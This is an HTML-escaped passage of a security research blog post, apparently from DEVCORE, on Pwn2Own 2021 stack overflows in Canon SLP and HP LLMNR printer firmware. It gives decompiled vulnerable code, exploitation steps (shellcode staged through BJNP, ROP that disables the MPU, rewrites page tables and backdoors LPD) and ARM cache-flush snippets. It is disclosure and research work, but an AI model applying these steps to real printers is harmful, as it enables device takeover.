        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------------------[3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_35:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[4] &lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_40:&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;next_one:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3645&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Scope longer than buffer provided&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_48:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt; is a case that handles no escape characters. It checks whether the length exceeds the maximum&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[4]&lt;/code&gt;. However, in case &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; handling escape characters, there is no length check, and the converted result is directly copied to the destination buffer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Once given a long escape characters string, it leads to a stack overflow.&lt;/p&gt;

&lt;p&gt;After finding the vulnerability, the first thing is to see what protection it has to decide on the exploit plan. But after analysis, we found that the Canon printer &lt;strong&gt;does not have any memory-related protection&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;protection&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;No DEP&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;No Stack Guard, no DEP and no ASLR, &lt;strong&gt;hacker friendly&lt;/strong&gt; ! Like back to the 90s, just a stack overflow can control the world. Next, like the past stack overflow exploit method, we just need to find a fixed address to store the shellcode, overwrite the return address, and jump to the shellcode. Eventually, we found the &lt;strong&gt;BJNP&lt;/strong&gt; service to store our shellcode.&lt;/p&gt;

&lt;h4 id=&quot;bjnp&quot;&gt;BJNP&lt;/h4&gt;
&lt;p&gt;BJNP is also a service discovery protocol designed by Canon, and there have been many vulnerabilities in the past. &lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;Synacktiv&lt;/a&gt; has also exploited Pixma MX925 through this protocol. For more details, please refer to &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#bjnp&quot;&gt;here&lt;/a&gt;. BJNP stores the controllable session data in the global buffer. We can use this function to put our shellcode in a fixed location without strict restrictions.&lt;/p&gt;

&lt;h4 id=&quot;exploitation-step&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Use BJNP to store our shellcode on a global buffer&lt;/li&gt;
  &lt;li&gt;Trigger stack overflow in SLP and overwrite return address&lt;/li&gt;
  &lt;li&gt;Return to the global buffer&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-1&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;Generally, the Pwn2Own organizer(ZDI) requests participants to prove that we have pwned the target. The presentation method here is up to players. Initially, we wanted to print the logo directly on the LCD screen as we exploited the Lexmark printer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, we spent a lot of time figuring out how to print the image on the screen, which was longer than finding vulnerabilities and writing exploits. In the end, a safer approach was adopted because of the time constraints, directly changing the &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#service-mode&quot;&gt;Service Mode&lt;/a&gt; string and printing it on the screen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, it is not that difficult to print the image on the screen. Other teams have found &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#displaying-an-image&quot;&gt;methods&lt;/a&gt;. Those who are interested can try it out :)&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/vQbQImZ3XRw?start=18400&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;debug&quot;&gt;Debug&lt;/h4&gt;
&lt;p&gt;Some people may wonder how to debug in this environment. There are usually several ways to debug:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Teardown the printer and get debug console.&lt;/li&gt;
  &lt;li&gt;Use an old exploit to install customized debugger&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, we have updated to the latest version at that time. There is no known vulnerability in this version, so we need to downgrade the version back. Tearing down the hardware also takes additional time and cost. But we already had a vulnerability at that time, it was not cost-effective to tear down the hardware or downgrade. Finally, we still used the most traditional sleep debug method.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/18.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After ROP or executing shellcode, print the result to a web page or other visible place, then call sleep. We can read the result from the web page and finally restart the machine to repeat this process.&lt;/p&gt;

&lt;p&gt;Next, let‚Äôs talk about HP printers.&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;

&lt;h4 id=&quot;link-local-multicast-name-resolution&quot;&gt;Link-Local Multicast Name Resolution&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution&quot;&gt;LLMNR&lt;/a&gt; is very similar to mDNS. It provides base name resolution on the same local link. But it is more straightforward than mDNS and usually also cooperates with some service discovery protocols. Here is a brief introduction to this mechanism:&lt;/p&gt;

&lt;p&gt;In the domain name resolution of the local area network, Client A will first use multicast to find the location of Client C in the local area network.
&lt;img src=&quot;/assets/img/blog/20231005/19.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After Client C receives, Client C sends it back to Client A, which implements the link-local domain name resolution.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/20.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LLMNR is mainly based on the &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc4795#section-2.1.1&quot;&gt;DNS packet&lt;/a&gt; format, and the format is as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/21.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The main format is the header followed by Queries, and Count represents the number of queries of different types.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/22.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Each DNS Query is composed of many labels, and each label will comprise length and string, as shown in the figure above. There is also a &lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc1035#section-4.1.4&quot;&gt;Message Compression&lt;/a&gt; mechanism. Dealing with these is very prone to vulnerabilities. &lt;a href=&quot;https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-dosSantos-The-Cost-of-Complexity-Different-Vulnerabilities-While-Implementing-the-Same-RFC.pdf&quot;&gt;‚ÄúTHE COST OF COMPLEXITY: Different Vulnerabilities While Implementing the Same RFC‚Äù&lt;/a&gt; at BlackHat 2021 also mentions similar problems.&lt;/p&gt;

&lt;h4 id=&quot;vulnerability-1&quot;&gt;Vulnerability&lt;/h4&gt;

&lt;p&gt;Let‚Äôs look at HP‚Äôs implementation:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;int llmnr_process_query(...){
    char result[292];
    consume_labels(llmnr_packet-&amp;gt;qname,result,...);
    ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here you can see that when HP processes LLMNR packets, it passes a fixed size buffer to consume_lables. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;consume_lables&lt;/code&gt; is used to process DNS labels, and the fixed buffer is used to store the results.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;int __fastcall consume_labels(char *src, char *dst, llmnr_hdr *a3)
{
  int v3; // r5
  int v4; // r12
  unsigned int len; // r3
  int v6; // r4
  char v7; // r6
  bool v8; // cc
  int v9; // r0
  unsigned __int8 chr; // r6
  int result; // r0

  v3 = 0;
  v4 = 0;
  len = 0;
  v6 = 0;
  while ( 1 )
  {
    chr = src[v3]; //-------------[1]
    if ( !chr )
      break;
    if ( (int)len &amp;lt;= 0 )
    {
      v8 = chr &amp;lt;= 0xC0u;
      if ( chr == 0xC0 )
      {
        v9 = src[v3 + 1];
        v6 = 1;
        v3 = 0;
        src = (char *)a3 + v9;
      }
      else
      {
        len = src[v3++];
        v8 = v4 &amp;lt;= 0;
      }
      if ( !v8 )
        dst[v4++] = &apos;.&apos;;
    }
    else
    {
      v7 = src[v3++];
      len = (char)(len - 1);
      dst[v4++] = v7; //----------[2]
    }
  }
  result = v3 + 1;
  dst[v4] = 0;
  if ( v6 )
    return 2;
  return result;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; will get the label length and then process it according to the type. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; is used as a case of length. There is no length check here, and the label is directly written into the dst buffer, leading to stack overflow. At this point, we thought we could exploit it in the similar way as Canon. However, when we were writing the exploit, we found that HP printers have more protection mechanisms.&lt;/p&gt;

&lt;h4 id=&quot;protection-1&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;XN(DEP)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Memory Protect Unit (MPU)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In this case, XN and MPU memory protection mechanisms are enabled, and this vulnerability has more restrictions. We &lt;strong&gt;can only overflow about 0x100 bytes without null byte&lt;/strong&gt;, which significantly restricts our ROP and makes it more challenging. We need to find other vulnerabilities or methods to achieve our goal.&lt;/p&gt;

&lt;p&gt;After a while, we started thinking about how HP printers implement XN(DEP) and MPU. Let‚Äôs review HP RTOS:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Linked with application code into single image&lt;/li&gt;
  &lt;li&gt;Many tasks run
    &lt;ul&gt;
      &lt;li&gt;in the same virtual address space&lt;/li&gt;
      &lt;li&gt;in kernel-mode&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After reviewing, we thought, can we bypass it by understanding the MMU and MPU in HP RTOS?&lt;/p&gt;

&lt;h4 id=&quot;mmu-in-hp-m283fdw&quot;&gt;MMU in HP M283fdw&lt;/h4&gt;

&lt;p&gt;HP M283fdw uses one-level page table translation and each translation table entry for translating a 1MB section. The translation table is located at &lt;strong&gt;0x4003c000&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/23.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Each translation table entry corresponds to a physical address and the permissions of the section. The CPU determines whether it can be executed or modified according to the entry. The permissions related here are AP, APX, and XN. We can also map any physical address through this translation table entry.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/24.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Generally, we can modify the translation table entry through ROP if we have stack overflow under high privileges. But when we tried to write directly to the translation table, the HP printer crashed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/25.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We checked and found that the leading cause of the memory fault exception is that Memory Protection Unit(MPU) protects the translation table.&lt;/p&gt;

&lt;h4 id=&quot;mpu-in-hp-m283fdw&quot;&gt;MPU in HP M283fdw&lt;/h4&gt;
&lt;p&gt;The MPU enables you to partition memory into regions and set individual protection attributes for each regions. It is an entirely different mechanism from MMU and is often found in IoT devices. HP enables MPU at boot and defines permissions for each region, so we cannot manipulate the page table.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/26.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a long time of reverse engineering and referencing the &lt;a href=&quot;https://developer.arm.com/documentation/ddi0403/d/System-Level-Architecture/System-Address-Map/Protected-Memory-System-Architecture--PMSAv7/Register-support-for-PMSAv7-in-the-SCS?lang=en#BEHJFJDI&quot;&gt;ARM Manual&lt;/a&gt;, we found that the MPU can be turned off by clearing MPU_CTRL. We found that the location is 0xE0400304, slightly different from ARM‚Äôs spec.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/27.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h4&gt;
&lt;p&gt;After understanding HP‚Äôs MMU and MPU mechanism, we can easily use ROP to turn off the MPU and successfully modify the translation table entry. We can arbitrarily modify the code of any service, and we finally chose &lt;a href=&quot;https://en.wikipedia.org/wiki/Line_Printer_Daemon_protocol&quot;&gt;Line Printer Daemon(LPD)&lt;/a&gt;. We modified it into a backdoor, read more payloads to the specified location, and finally executed the shellcode.&lt;/p&gt;

&lt;p&gt;But there is one thing that must be mentioned. After the translation table entry and LPD code are overwritten, be sure to &lt;strong&gt;flush TLB&lt;/strong&gt; and &lt;strong&gt;invalidate I-cache and D-cache&lt;/strong&gt;. Otherwise, it is very likely to execute in the old one, causing the exploit to fail.&lt;/p&gt;

&lt;p&gt;Flush TLB&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flush_tlb:
    mov r12, #0
    mcr p15, 0, r12, c8, c7, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Invalidate I-cache&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;disable_icache:
    mrc p15, 0, r1, c1, c0, 0
    bic r1, r1, #(1 &amp;lt;&amp;lt; 12)
    mcr p15, 0, r1, c1, c0, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;exploitation-step-1&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Trigger stack overflow in LLMNR and overwrite return address&lt;/li&gt;
  &lt;li&gt;Use limited ROP to
    &lt;ul&gt;
      &lt;li&gt;disable MPU&lt;/li&gt;
      &lt;li&gt;modify translation table entry and get read-write execute permission&lt;/li&gt;
      &lt;li&gt;flush TLB&lt;/li&gt;
      &lt;li&gt;modify the code of LPD&lt;/li&gt;
      &lt;li&gt;invalidate I-cache and D-cache&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Use modified LPD to read our shellcode and jump to shellcode&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-2&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;When we could execute the shellcode, we only had one week left, and we finally chose to use the exact string to display &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwned by DEVCORE&lt;/code&gt; on the LCD.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/28.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

